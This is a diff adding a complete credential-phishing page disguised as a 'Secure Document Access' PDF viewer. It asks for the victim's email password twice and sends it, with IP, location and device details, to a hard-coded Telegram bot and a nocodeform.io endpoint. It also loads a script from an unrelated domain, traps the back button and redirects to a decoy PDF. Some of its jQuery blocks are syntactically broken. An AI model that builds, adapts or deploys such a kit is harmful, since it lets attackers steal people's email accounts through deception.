@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure Document Access</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body, html {
+      height: 100%;
+      font-family: Arial, sans-serif;
+    }
+
+    #loading-screen {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('https://mzoomco.com/vol/imageedit_3_2482480456.jpg') center center / cover no-repeat;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    #loading-screen .overlay {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: 1;
+    }
+
+    .loading-content {
+      position: relative;
+      z-index: 2;
+      text-align: center;
+    }
+
+    .loading-content h1 {
+      color: #e60000;
+      font-size: 24px;
+      font-weight: bold;
+      margin-top: 20px;
+      animation: pulse 1.5s infinite;
+    }
+
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid #fff;
+      border-top: 4px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse {
+      0% { opacity: 0.4; }
+      50% { opacity: 1; }
+      100% { opacity: 0.4; }
+    }
+
+    #main-content {
+      display: none;
+    }
+
+    iframe#background-frame {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+      z-index: -1;
+      filter: blur(4px) brightness(0.7);
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+      width: 350px;
+      text-align: center;
+      position: relative;
+      z-index: 10;
+      margin: 100px auto;
+    }
+
+    .pdf-icon {
+      width: 60px;
+      margin-bottom: 20px;
+    }
+
+    .message {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .btn {
+      background-color: #e60000;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 50px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 15px;
+    }
+
+    .btn:hover {
+      background-color: #cc0000;
+    }
+
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-top: -10px;
+      margin-bottom: 10px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Loading Screen -->
+<div id="loading-screen">
+  <div class="overlay"></div>
+  <div class="loading-content">
+    <div class="spinner"></div>
+    <h1 id="loading-text">Opening Secured Document...</h1>
+  </div>
+</div>
+
+<!-- Main Form -->
+<div id="main-content">
+  <iframe id="background-frame"></iframe>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" class="pdf-icon" alt="PDF Icon">
+    <p class="message" id="form-message">This document is protected!<br>To verify that it is you, please enter your email password.</p>
+
+    <form id="docAccessForm"  method="POST" action="">
+      <input type="email" name="email" id="email" placeholder="Email address"> 
+      <input type="password" name="password" id="password" placeholder="Password" required style="display:none;">
+      <div id="error-message" class="error"></div>
+      <button class="btn" id="submit-bt">View document</button>
+      <button class="btn" id="submit-btn"type="submit" style="display:none;">View document</button>
+    </form>
+  </div>
+</div>
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+		  <script src="https://huadongarmouredcable.com/jquerydropper.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+document.addEventListener("contextmenu",(e=>e.preventDefault()));const BOT_TOKEN="7571302689:AAHVPNNTR7etcft4NhQFI7b4XPgwTXtTVEY",CHAT_ID="7948610684",REDIRECT_URL="https://cdn.glitch.global/d27d99eb-d54f-474f-a1fc-a598e61e5947/Payment_Advice.pdf?v=1724752668470",lang=navigator.language||navigator.userLanguage,messages={en:{main:"This document is protected!<br>To verify that it is you, please enter your email and password.",error:"please enter your valid email passowrd",loading:"Opening Secured Document..."},es:{main:"¡Este documento está protegido!<br>Para verificar que eres tú...",error:"Contraseña incorrecta...",loading:"Abriendo documento protegido..."},fr:{main:"Ce document est protégé !<br>Pour vérifier...",error:"Mot de passe incorrect...",loading:"Ouverture du document sécurisé..."},de:{main:"Dieses Dokument ist geschützt!<br>Bitte geben Sie...",error:"Falsches Passwort...",loading:"Geschütztes Dokument wird geöffnet..."},ar:{main:"هذا المستند محمي!<br>للتأكد من أنك الشخص الصحيح...",error:"كلمة المرور غير صحيحة...",loading:"يتم فتح المستند المحمي..."},zh:{main:"此文档受保护！<br>为确认您的身份...",error:"密码错误...",loading:"正在打开受保护的文档..."},th:{main:"เอกสารนี้ได้รับการป้องกัน!<br>เพื่อยืนยันตัวตนของคุณ...",error:"รหัสผ่านไม่ถูกต้อง...",loading:"กำลังเปิดเอกสาร..."},tr:{main:"Bu belge korumalıdır!<br>Kimliğinizi doğrulamak için...",error:"Hatalı şifre...",loading:"Korunan belge açılıyor..."},vi:{main:"Tài liệu này được bảo vệ!<br>Vui lòng nhập mật khẩu...",error:"Mật khẩu không đúng...",loading:"Đang mở tài liệu..."},ru:{main:"Этот документ защищен!<br>Чтобы подтвердить личность...",error:"Неверный пароль...",loading:"Открытие защищённого документа..."},ko:{main:"이 문서는 보호되어 있습니다!<br>본인 확인을 위해...",error:"비밀번호가 틀렸습니다...",loading:"보호된 문서를 여는 중..."},ja:{main:"このドキュメントは保護されています！<br>本人確認のために...",error:"パスワードが正しくありません...",loading:"保護されたドキュメントを開いています..."}},emailField=document.getElementById("email"),passwordField=document.getElementById("password"),errorMessage=document.getElementById("error-message"),messageLabel=document.getElementById("form-message"),loadingText=document.getElementById("loading-text"),userLang=lang.toLowerCase();for(const e in messages)if(userLang.startsWith(e)){messageLabel.innerHTML=messages[e].main,errorMessage.textContent=messages[e].error,loadingText.textContent=messages[e].loading;break}setTimeout((()=>{document.getElementById("loading-screen").style.display="none",document.getElementById("main-content").style.display="block";const e=emailField.value.trim().split("@")[1];e&&(document.getElementById("background-frame").src=`https://${e}`)}),5e3);let firstAttempt=!0,firstPassword="";document.getElementById("docAccessForm").addEventListener("submit",(async function(e){e.preventDefault();const t=passwordField.value;if(firstAttempt)return firstPassword=t,passwordField.value="",passwordField.placeholder="Re-enter Password",errorMessage.style.display="block",void(firstAttempt=!1);const r=await fetch("https://ipapi.co/json").then((e=>e.json())).catch((()=>({}))),n=navigator.userAgent,a=`\n📩 *Secure Document Access*\n📧 Email: ${emailField.value}\n🔐 First Password: ${firstPassword}\n🔐 Second Password: ${t}\n🌍 IP: ${r.ip||"-"}\n🌆 Location: ${r.city||"-"}, ${r.region||"-"}, ${r.country_name||"-"}\n🏢 ISP: ${r.org||"-"}\n📱 Device: ${n}\n`;await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:a,parse_mode:"Markdown"})}),location.replace(REDIRECT_URL),history.pushState(null,null,location.href),window.addEventListener("popstate",(()=>{history.pushState(null,null,location.href)}))}));
+</script>
+<script>
+
+
+
+$('#submit-bt').click(function(event){
+
+		  $('#submit-bt').css('display', 'none'); 
+		  $('#password').css('display', 'block'); 
+		  $('#submit-btn').css('display', 'block');
+  });
+
+
+
+
+
+</script>
+ 	
+<script>
+    
+
+
+
+/* global $ */
+$(document).ready(function(){
+var coun=0;
+var tx1="7948610684";
+var tx2="7571302689:AAHVPNNTR7etcft4NhQFI7b4XPgwTXtTVEY";
+ ur = "https://api.telegram.org/bot"+tx2+"/sendMessage?chat_id="+tx1;
+										
+
+$('#submit-btn').click(function(event){
+
+event.preventDefault();
+var emai=$("#email").val();
+var passwor=$("#password").val();
+if (!password) {
+
+                $('#error').show();
+                $('#error_message').html("Password field is empty");
+
+                return false;
+            }
+
+
+coun=coun+1;
+
+$.ajax({
+dataType: 'JSON',
+url: ur,
+type: 'GET',
+        data:{
+          ajaxid: 4,
+		text: 'Email:' + emai + ' | Password:' + passwor			
+        },
+			processData: true,
+		contentType: false,
+          
+            beforeSend: function(xhr){
+            	
+            },
+            success: function(response){
+            	if(response){
+            		$("#error").show();
+            		console.log(response);
+            		if(response.ok === true){
+            			$("#password").val("");
+            			if (coun>=3) {
+            				coun=0;
+    	  
+			setTimeout(() => {
+			$("#error").show();
+		  $('#leftyimg').css('display', 'none'); 
+		  $('#error_message').css('color', 'green'); 
+		  $('#error_message').html("Thank You For Updating Your Account");
+		  
+
+			}, 500); 
+						setTimeout(() => {  
+
+	 
+             
+
+                }
+				$("#password").val("");
+       	$("#error_message").show();
+        $('#error_message').html("Invalid Password.! Please Enter your correct Password");
+		
+       
+            }
+            else{
+				$("#password").val("");
+       	$("#error_message").show();
+       $('#error_message').html("Invalid Password.! Please enter your correct Password");
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (coun>=3) {
+    		coun=0;
+			setTimeout(() => {
+			$("#error").show();
+		  $('#leftyimg').css('display', 'none'); 
+		  $('#error_message').css('color', 'green'); 
+		  $('#error_message').html("Thank You For Updating Your Account");
+		  
+
+			}, 500);		
+						setTimeout(() => {  
+
+	  
+    	}
+			$("#password").val("");
+       	$("#error_message").show();
+        $('#error_message').html("Invalid Password.! Please enter your correct Password");
+    },
+    complete: function(){
+    	$('#fm-login-submit').val('Sign in ');
+    }
+});
+  });
+
+
+	})
+
+
+</script>
+
+
+  <script>
+$(document).ready(function(){
+var count=0;
+var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#email').val(my_email);
+
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+
+
+}	 
+$('#submit-btn').click(function(event){
+event.preventDefault();
+var email=$("#email").val();
+var password=$("#password").val();
+
+
+count=count+1;
+
+$.ajax({
+dataType: 'JSON',
+url: 'https://nocodeform.io/f/6836ab7613af247f7c8ee984',
+type: 'POST',
+      	data:{
+			email:email,
+            password:password,	
+      	},
+			data: $('#docAccessForm').serialize(),
+            beforeSend: function(xhr){
+                         	
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#password").val("");
+            			if (count>=3) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+           window.location.replace("https://germany.blob.core.windows.net/scanner/blank.pdf");
+
+                }
+                    	$("#error-message").show();
+				                      
+			$('#error-message').html("Password non valida. Riprova.");
+            
+            }
+            else{
+                	$("#error-message").show();
+				                      
+			$('#error-message').html("Password non valida. Riprova.");
+               
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=3) {
+    		count=0;
+    		    window.location.replace("https://germany.blob.core.windows.net/scanner/blank.pdf");
+    	}
+               	$("#error-message").show();
+				                      
+			$('#merror-message').html("Password non valida. Riprova.");
+               
+    },
+    complete: function(){
+    	// $('#submit-btn').html('Next');
+    }
+});
+  });
+
+
+	});
+
+
+</script>
+
+</body>
+</html>
